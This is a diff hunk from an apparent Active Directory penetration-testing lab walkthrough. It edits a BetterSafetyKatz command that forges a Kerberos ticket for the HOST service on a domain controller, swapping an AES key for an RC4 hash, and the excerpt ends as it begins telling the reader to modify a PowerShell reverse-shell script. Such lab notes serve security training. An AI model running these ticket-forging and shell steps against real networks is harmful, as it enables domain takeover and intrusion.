@@ -395,7 +395,7 @@ Try to get command execution on the domain controller by creating silver ticket 
 *HOST service*
 Create the golden ticket
 ```powershell
-C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-19815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-19815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:af0686cc0ca8f04df42210c9ac980760 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 ```
 Modify Invoke-PowerShellTcp.ps1. Paste and the end of the file the following line
 ```
